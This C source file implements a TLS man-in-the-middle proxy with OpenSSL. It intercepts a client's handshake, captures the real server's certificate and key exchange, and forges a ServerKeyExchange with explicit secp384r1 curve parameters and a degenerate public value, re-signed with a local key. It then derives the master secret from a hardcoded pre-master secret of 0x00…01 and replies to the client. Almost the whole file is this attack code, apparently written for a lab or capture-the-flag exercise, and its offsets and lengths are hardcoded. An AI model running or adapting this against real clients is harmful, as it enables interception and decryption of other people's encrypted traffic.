#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <openssl/ssl.h>
#include <openssl/err.h>


int server_sock;
int client_socket;

unsigned char client_random[32];
unsigned char server_random[32];
unsigned char server_key_exchange[4096];
unsigned char server_certificate[4096];
unsigned char server_signature[4096];
unsigned char p[4096];
unsigned char g[4096];
unsigned char signature_data[4096];

size_t server_key_exchange_len = 0;
size_t server_signature_len = 0;
size_t server_certificate_len = 0;
size_t p_len = 0;
size_t g_len = 0;
size_t signature_data_len = 0;


#define MASTER_SECRET_LENGTH 48
#define FINISHED_MESSAGE_LENGTH 12
#define PRE_MASTER_SECRET_LENGTH 48
#define SEED_LENGTH 64


unsigned char master_secret[MASTER_SECRET_LENGTH];
unsigned char pre_master_secret[48] = {
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01
};


// Initialize OpenSSL
void initialize_openssl() {
    SSL_load_error_strings();
    OpenSSL_add_ssl_algorithms();
}

// Cleanup OpenSSL
void cleanup_openssl() {
    EVP_cleanup();
}

// Create SSL context for the MITM
SSL_CTX *create_context() {
    const SSL_METHOD *method;
    SSL_CTX *ctx;

    method = SSLv23_client_method();
    ctx = SSL_CTX_new(method);
    if (!ctx) {
        perror("Unable to create SSL context");
        ERR_print_errors_fp(stderr);
        exit(EXIT_FAILURE);
    }

    SSL_CTX_set_cipher_list(ctx, "DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256");

    SSL_CTX_set_options(ctx, SSL_OP_NO_SSLv2 | SSL_OP_NO_SSLv3 | SSL_OP_NO_TLSv1 | SSL_OP_NO_TLSv1_1 | SSL_OP_NO_TLSv1_3);

    if (SSL_CTX_set1_curves_list(ctx, "secp384r1") != 1) {
        perror("Unable to set curves list");
        ERR_print_errors_fp(stderr);
        exit(EXIT_FAILURE);
    }
    return ctx;
}


// Create a socket and connect to the server
int connect_to_server(const char *server_host, int server_port) {
    int sock;
    struct sockaddr_in server_addr;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Unable to create socket");
        exit(EXIT_FAILURE);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(server_port);
    if (inet_pton(AF_INET, server_host, &server_addr.sin_addr) <= 0) {
        perror("Invalid address/ Address not supported");
        close(sock);
        exit(EXIT_FAILURE);
    }

    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        perror("Connection failed");
        close(sock);
        exit(EXIT_FAILURE);
    }

    server_sock = sock;
    return sock;
}

EVP_PKEY *load_private_key(const char *keyfile) {
    FILE *fp = fopen(keyfile, "r");
    if (!fp) {
        perror("Unable to open private key file");
        return NULL;
    }
    EVP_PKEY *pkey = PEM_read_PrivateKey(fp, NULL, NULL, NULL);
    fclose(fp);
    return pkey;
}

int sign_data(EVP_PKEY *pkey, const unsigned char *data, size_t data_len, unsigned char *sig, size_t *sig_len) {
    EVP_MD_CTX *mdctx = EVP_MD_CTX_new();
    if (!mdctx) {
        ERR_print_errors_fp(stderr); 
        return 0;
    }
    
    // Initialize the digest and signature context with RSA-PSS and SHA-256
    if (EVP_DigestSignInit(mdctx, NULL, EVP_sha256(), NULL, pkey) != 1) {
        ERR_print_errors_fp(stderr); 
        EVP_MD_CTX_free(mdctx);
        return 0;
    }

    EVP_PKEY_CTX *pkey_ctx = EVP_MD_CTX_pkey_ctx(mdctx);

    if (EVP_PKEY_CTX_set_rsa_padding(pkey_ctx, RSA_PKCS1_PSS_PADDING) != 1) {
            ERR_print_errors_fp(stderr);
            EVP_MD_CTX_free(mdctx);
            return 0;
    }
    if (EVP_PKEY_CTX_set_rsa_pss_saltlen(pkey_ctx, EVP_MD_size(EVP_sha256())) != 1) {
            ERR_print_errors_fp(stderr); 
            EVP_MD_CTX_free(mdctx);
            return 0;
    }

    // Perform the signature operation
    if (EVP_DigestSign(mdctx, sig, sig_len, data, data_len) != 1) {
        ERR_print_errors_fp(stderr);
        EVP_MD_CTX_free(mdctx);
        return 0;
    }
    
    EVP_MD_CTX_free(mdctx);
    return 1;
}


void print_buffer(const unsigned char *buf, size_t len) {
    if (buf == NULL || len == 0) {
        printf("Buffer is NULL or empty\n");
        return;
    }

    for (size_t i = 0; i < len; i++) {
        printf("%02x ", buf[i]);
        
        // Optional: Print a newline every 16 bytes for better readability
        if ((i + 1) % 16 == 0) {
            printf("\n");
        }
    }
    printf("\n");
}

// TLS PRF using HMAC-SHA256
void tls_prf(const unsigned char *secret, size_t secret_len, const char *label,
             const unsigned char *seed, size_t seed_len, unsigned char *out, size_t out_len) {
    unsigned char prf_buffer[EVP_MAX_MD_SIZE];
    unsigned int prf_len;
    size_t offset = 0;
    size_t label_len = strlen(label);

    HMAC_CTX *hmac_ctx = HMAC_CTX_new();
    HMAC_CTX_reset(hmac_ctx);

    while (offset < out_len) {
        // A(i) = HMAC(secret, A(i-1))
        HMAC_Init_ex(hmac_ctx, secret, secret_len, EVP_sha256(), NULL);
        if (offset == 0) {
            HMAC_Update(hmac_ctx, (unsigned char *)label, label_len);
            HMAC_Update(hmac_ctx, seed, seed_len);
        } else {
            HMAC_Update(hmac_ctx, prf_buffer, prf_len);
        }
        HMAC_Final(hmac_ctx, prf_buffer, &prf_len);

        // PRF output = HMAC(secret, A(i) + seed)
        HMAC_Init_ex(hmac_ctx, secret, secret_len, EVP_sha256(), NULL);
        HMAC_Update(hmac_ctx, prf_buffer, prf_len);
        HMAC_Update(hmac_ctx, (unsigned char *)label, label_len);
        HMAC_Update(hmac_ctx, seed, seed_len);
        HMAC_Final(hmac_ctx, prf_buffer, &prf_len);

        size_t copy_len = prf_len < (out_len - offset) ? prf_len : (out_len - offset);
        memcpy(out + offset, prf_buffer, copy_len);
        offset += copy_len;
    }

    HMAC_CTX_free(hmac_ctx);
}

void derive_master_secret(unsigned char *master_secret, const unsigned char *pre_master_secret,
                          const unsigned char *client_random, const unsigned char *server_random) {
    const char *label = "master secret";
    unsigned char seed[SEED_LENGTH];

    // Concatenate client random and server random to create the seed
    memcpy(seed, client_random, 32);
    memcpy(seed + 32, server_random, 32);

    // Use the PRF to derive the master secret
    tls_prf(pre_master_secret, PRE_MASTER_SECRET_LENGTH, label, seed, SEED_LENGTH, master_secret, MASTER_SECRET_LENGTH);
    printf("Master Secret:\n");
    print_buffer(master_secret, MASTER_SECRET_LENGTH);
}

// Message callback function to capture and print handshake messages
void message_callback(int write_p, int version, int content_type, const void *buf, size_t len, SSL *ssl, void *arg) {
    const unsigned char *p = buf;
    int msg_type = p[0];
    if (content_type == SSL3_RT_HANDSHAKE) {
        if (msg_type == SSL3_MT_SERVER_KEY_EXCHANGE) {
            memcpy(server_key_exchange, buf + 7, 97);
            server_key_exchange_len = 97;
            server_key_exchange[95] = 0x00;
            server_key_exchange[96] = 0x01;
            server_key_exchange[server_key_exchange_len] = 0x01;
            server_key_exchange_len++;

        } else if (msg_type == SSL3_MT_CERTIFICATE) {
            memcpy(server_certificate, buf, len);
            server_certificate_len = len;
        } else if (msg_type == SSL3_MT_SERVER_DONE) {
            close(server_sock);
        } 
    }
}


// Intercept messages and establish a connection to the server
void intercept_and_relay(int client_sock, const char *server_host, int server_port) {
    // Read ClientHello message
    client_socket = client_sock;
    unsigned char client_hello[4096];
    int bytes_read = read(client_sock, client_hello, 43);
    if (bytes_read <= 0) {
        perror("Failed to read ClientHello");
        close(client_sock);
        exit(EXIT_FAILURE);
    }

    // Extract client random from ClientHello
    memcpy(client_random, client_hello+11, 32);
    
    // Create MITM SSL context
    SSL_CTX *ctx = create_context();
    SSL_CTX_set_msg_callback(ctx, message_callback);  
    SSL *ssl;
    int server_sock = connect_to_server(server_host, server_port);   

    ssl = SSL_new(ctx);
    SSL_set_fd(ssl, server_sock);

    EVP_PKEY *pkey = load_private_key("private_files/server.key");

    // Initiate SSL handshake with the server
    if (SSL_connect(ssl) <= 0) {

        // ServerHello message construction
        unsigned char prefix_sh[] = {0x16, 0x03, 0x03, 0x00, 0x39, 0x02, 0x00, 0x00, 0x35, 0x03, 0x03};
        unsigned char server_hello[4096];
        size_t server_hello_len = sizeof(prefix_sh) + 4 + 28 + 19;

        // Get GMT Unix time
        time_t current_time = time(NULL);
        unsigned char gmt_unix_time[4];
        gmt_unix_time[0] = (current_time >> 24) & 0xFF;
        gmt_unix_time[1] = (current_time >> 16) & 0xFF;
        gmt_unix_time[2] = (current_time >> 8) & 0xFF;
        gmt_unix_time[3] = current_time & 0xFF;

        // Generate random bytes for the rest of the ServerHello random field
        unsigned char random_bytes[28];
        FILE *urandom = fopen("/dev/urandom", "r");
        if (!urandom) {
            perror("Failed to open /dev/urandom");
            exit(EXIT_FAILURE);
        }
        fread(random_bytes, 1, sizeof(random_bytes), urandom);
        fclose(urandom);

        // Concatenate GMT Unix time and random bytes
        unsigned char random[32];
        memcpy(random, gmt_unix_time, sizeof(gmt_unix_time));
        memcpy(random + sizeof(gmt_unix_time), random_bytes, sizeof(random_bytes));
        memcpy(server_random, random, 32);
        unsigned char server_hello_end[] = {0x00, 0x00, 0x9e, 0x00, 0x00, 0x0d, 0xff, 0x01, 0x00, 0x01, 0x00, 0x00, 0x23, 0x00, 0x00, 0x00, 0x17, 0x00, 0x00};

        // Construct the ServerHello message
        memcpy(server_hello, prefix_sh, sizeof(prefix_sh));
        memcpy(server_hello + sizeof(prefix_sh), random, sizeof(random));
        memcpy(server_hello + sizeof(prefix_sh) + sizeof(random), server_hello_end, sizeof(server_hello_end));
        server_hello_len = sizeof(prefix_sh) + sizeof(random) + sizeof(server_hello_end);

        // ServerKeyExchange message construction#
        // Prefix : Content type, version, length, message type, length of the message
        unsigned char skx_prefix[] = {    
            0x16, 0x03, 0x03, 0x02, 0x93, 0x0c, 0x00, 0x02, 0x8F,
            // Curve information of secp384r1
            0x01, // Curve type: prime field (1 byte)
            0x30, // Prime length: 48 bytes (1 byte)
            0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
            0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFE, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,

            0x30, // Length of parameter a: 48 bytes (1 byte)
            0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
            0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFE, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFC,

            0x30, // Length of parameter b: 48 bytes (1 byte)
            0xB3, 0x31, 0x2F, 0xA7, 0xE2, 0x3E, 0xE7, 0xE4, 0x98, 0x8E, 0x05, 0x6B, 0xE3, 0xF8, 0x2D, 0x19,
            0x18, 0x1D, 0x9C, 0x6E, 0xFE, 0x81, 0x41, 0x12, 0x03, 0x14, 0x08, 0x8F, 0x50, 0x13, 0x87, 0x5A,
            0xC6, 0x56, 0x39, 0x8D, 0x8A, 0x2E, 0xD1, 0x9D, 0x2A, 0x85, 0xC8, 0xED, 0xD3, 0xEC, 0x2A, 0xEF,

            0x61, // Base point length: 97 bytes (1 byte)
            0x04, 0xAA, 0x87, 0xCA, 0x22, 0xBE, 0x8B, 0x05, 0x37, 0x8E, 0xB1, 0xC7, 0x1E, 0xF3, 0x20, 0xAD,
            0x74, 0x6E, 0x1D, 0x3B, 0x62, 0x8B, 0xA7, 0x9B, 0x98, 0x59, 0xF7, 0x41, 0xE0, 0x82, 0x54, 0x2A,
            0x38, 0x55, 0x02, 0xF2, 0x5D, 0xBF, 0x55, 0x29, 0x6C, 0x3A, 0x54, 0x5E, 0x38, 0x72, 0x76, 0x0A,
            0xB7, 0x36, 0x17, 0xDE, 0x4A, 0x96, 0x26, 0x2C, 0x6F, 0x5D, 0x9E, 0x98, 0xBF, 0x92, 0x92, 0xDC,
            0x29, 0xF8, 0xF4, 0x1D, 0xBD, 0x28, 0x9A, 0x14, 0x7C, 0xE9, 0xDA, 0x31, 0x13, 0xB5, 0xF0, 0xB8,
            0xC0, 0x0A, 0x60, 0xB1, 0xCE, 0x1D, 0x7E, 0x81, 0x9D, 0x7A, 0x43, 0x1D, 0x7C, 0x90, 0xEA, 0x0E,
            0x5F,

            0x30, // Order length: 48 bytes (1 byte)
            0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
            0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xC7, 0x63, 0x4D, 0x81, 0xF4, 0x37, 0x2D, 0xDF,
            0x58, 0x1A, 0x0D, 0xB2, 0x48, 0xB0, 0xA7, 0x7A, 0xEC, 0xEC, 0x19, 0x6A, 0xCC, 0xC5, 0x29, 0x73,

            0x01, // Cofactor length: 1 byte    
            0x01  // Cofactor
        };

        // Construct the ServerKeyExchange message
        size_t prefix_len = sizeof(skx_prefix);
        unsigned char modified_server_key_exchange[4096];
        size_t modified_server_key_exchange_len = 0;

        // Construct the signature data (p)
        memcpy(p, skx_prefix + 9, sizeof(skx_prefix)-9);
        memcpy(p + sizeof(skx_prefix)-9, server_key_exchange, 9);
        p_len = sizeof(skx_prefix);

        // Construct the signature data (g)
        memcpy(g, server_key_exchange + 9, 86);
        g_len = 86;

        // Construct the signature data (client_random, server_random, p, g, Ys)
        memcpy(server_signature, client_random, 32);
        memcpy(server_signature + 32, random, 32);
        memcpy(server_signature + 64, p, p_len);
        memcpy(server_signature + 64 + p_len, g, 86);
        server_signature[64 + p_len + 86] = 0x00;
        server_signature[64 + p_len + 87] = 0x01;
        server_signature[64 + p_len + 88] = 0x01;
        server_signature_len = 64 + p_len + 89;
        sign_data(pkey, server_signature, server_signature_len, server_signature, &server_signature_len);

        // Construct the signature data (Prefix)
        signature_data[0] = 0x08;
        signature_data[1] = 0x04;
        signature_data[2] = 0x01;
        signature_data[3] = 0x00;
        memcpy(signature_data + 4, server_signature, server_signature_len);
        signature_data_len = 4 + server_signature_len;

        // Final Constructed ServerKeyExchange message
        memcpy(modified_server_key_exchange, skx_prefix, prefix_len);
        memcpy(modified_server_key_exchange + prefix_len, server_key_exchange, server_key_exchange_len);
        memcpy(modified_server_key_exchange + prefix_len + server_key_exchange_len, signature_data, signature_data_len);
        modified_server_key_exchange_len = prefix_len + server_key_exchange_len + signature_data_len;

        // ServerCertificate message construction
        unsigned char cert_prefix[] = {0x16, 0x03, 0x03, 0x02, 0xbd};
        size_t cprefix_len = sizeof(cert_prefix);
        unsigned char modified_server_certificate[4096];
        size_t modified_server_certificate_len = 0;

        memcpy(modified_server_certificate, cert_prefix, cprefix_len);
        memcpy(modified_server_certificate + cprefix_len, server_certificate, server_certificate_len);
        modified_server_certificate_len = cprefix_len + server_certificate_len;

        // ServerHelloDone message construction
        unsigned char server_hello_done[] = {0x16, 0x03, 0x03, 0x00, 0x4, 0x0e, 0x00, 0x00, 0x00};
        size_t server_hello_done_len = sizeof(server_hello_done);

        // Send all the messages to the client
        unsigned char all_data[4096];
        size_t all_data_len = 0;

        memcpy(all_data, server_hello, server_hello_len);
        all_data_len += server_hello_len;

        memcpy(all_data + all_data_len, modified_server_certificate, modified_server_certificate_len);
        all_data_len += modified_server_certificate_len;

        memcpy(all_data + all_data_len, modified_server_key_exchange, modified_server_key_exchange_len);
        all_data_len += modified_server_key_exchange_len;


        memcpy(all_data + all_data_len, server_hello_done, server_hello_done_len);
        all_data_len += server_hello_done_len;
        write(client_sock, all_data, all_data_len);

        unsigned char client_response[4096];
        int bytes_read = read(client_sock, client_response, sizeof(client_response));
        if (bytes_read <= 0) {
            close(client_sock);
            exit(EXIT_FAILURE);
        }
    }
}

void read_client_key_exchange(int client_sock) {
    SSL_CTX *ctx = create_context();
    SSL *ssl = SSL_new(ctx);
    SSL_set_fd(ssl, client_sock); 

    unsigned char client_ke[4096];
    unsigned char client_pke[4096];
    unsigned char client_encryption[4096];
    long bytes_read = read(client_sock, client_ke, sizeof(client_ke));
    if (bytes_read <= 0) {
        perror("Failed to read ClientKeyExchange");
        close(client_sock);
        exit(EXIT_FAILURE);
    }

    memcpy(client_pke, client_ke + 11,304);
    int pke_len = 304;

    memcpy(client_encryption, client_ke + 326, 40);
    int encryption_len = 40;

    printf("Client Encrypted:\n");
    print_buffer(client_encryption, encryption_len);
        

    // Construct NewSessionTicket message
    unsigned char new_session_ticket[] = {
        0x16, 0x03, 0x03,
        0x00, 0xaa, // Length of the message
        0x04,
        0x00, 0x00, 0xa6, // Length of the ticket
        0x00, 0x00, 0x1c, 0x20, // Session Ticket Lifetime Hint
        0x00, 0xa0, // Session Ticket Length
        0x8c, 0xa4, 0x9b, 0x76, 0x83, 0x26, 0x02, 0x6a, 0x94, 0xc8, 0x47, 0x32, 0xc8, 0x74, 0x57, 0xf1,
        0x5f, 0x2c, 0x5f, 0x3c, 0x9c, 0x0f, 0x91, 0x14, 0xbc, 0xc2, 0x0f, 0x6e, 0x87, 0xcb, 0x80, 0x34,
        0x34, 0x9e, 0xcc, 0x10, 0xcd, 0x3c, 0x72, 0x1e, 0x72, 0x41, 0x63, 0x06, 0xea, 0x1a, 0x86, 0x3e,
        0xdc, 0xf2, 0x48, 0x94, 0x8f, 0x0f, 0xef, 0x2f, 0x74, 0xfc, 0x70, 0x86, 0xeb, 0x08, 0xaa, 0xc1,
        0xef, 0x6c, 0x49, 0x2b, 0x67, 0x6b, 0x54, 0xc7, 0xfd, 0x0c, 0x55, 0x08, 0xe4, 0x6a, 0xd1, 0x84,
        0xbf, 0x73, 0x27, 0x4a, 0x13, 0x13, 0xa3, 0x5b, 0x7d, 0xe5, 0x44, 0xd3, 0xac, 0x30, 0xa5, 0x90,
        0x68, 0xfe, 0x33, 0xac, 0x1a, 0x9f, 0x95, 0xc2, 0xce, 0xb4, 0xbc, 0x55, 0x75, 0x65, 0x14, 0x46,
        0x69, 0x14, 0x9f, 0x96, 0xc8, 0x13, 0x03, 0xd0, 0xf0, 0x30, 0x83, 0xd1, 0x92, 0x16, 0xfc, 0x0b,
        0x58, 0xa3, 0x0c, 0x21, 0xe4, 0x5f, 0x5d, 0x1e, 0x06, 0x1f, 0xa3, 0x7e, 0x6c, 0x11, 0x8b, 0xde,
        0x29, 0x58, 0x59, 0xff, 0x89, 0x87, 0x78, 0x53, 0x02, 0xe8, 0xd7, 0xe2, 0x03, 0xa4, 0xf0, 0xc8  // Session Ticket
    };

    // Construct ChangeCipherSpec message
    unsigned char change_cipher_spec[] = {
        0x14, 0x03, 0x03, 0x00, 0x01, 0x01
    };

    // Construct Encrypted Handshake message
    unsigned char encrypted_handshake[] = {
        0x16, 0x03, 0x03, 
        0x00, 0x28, // Length of the message
    };

    derive_master_secret(master_secret, pre_master_secret, client_random, server_random);

    unsigned char server_finished[4096];
    memcpy(server_finished, new_session_ticket, 175);
    memcpy(server_finished + 175, change_cipher_spec, 6);
    memcpy(server_finished + 181, encrypted_handshake, 5);
    memcpy(server_finished + 186, client_encryption, encryption_len);

    write(client_sock, server_finished, 226);
}

int create_socket(const char *host, int port) {
    int sock;
    struct sockaddr_in addr;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Unable to create socket");
        exit(EXIT_FAILURE);
    }

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(host);

    if (bind(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        perror("Unable to bind");
        close(sock);
        exit(EXIT_FAILURE);
    }

    if (listen(sock, 1) < 0) {
        perror("Unable to listen");
        close(sock);
        exit(EXIT_FAILURE);
    }

    return sock;
}

int main(int argc, char **argv) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <host> <port> <server_port>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    const char *host = argv[1];
    int port = atoi(argv[2]);
    int server_port = atoi(argv[3]);

    initialize_openssl();

    int server_sock = create_socket(host, port);

    while (1) {
        struct sockaddr_in addr;
        socklen_t len = sizeof(addr);
        int client_sock = accept(server_sock, (struct sockaddr*)&addr, &len);
        if (client_sock < 0) {
            perror("Unable to accept");
            close(server_sock);
            cleanup_openssl();
            exit(EXIT_FAILURE);
        }
        intercept_and_relay(client_sock, host, server_port); 
        read_client_key_exchange(client_sock);
    }
    close(server_sock);
    cleanup_openssl();

    return 0;

}
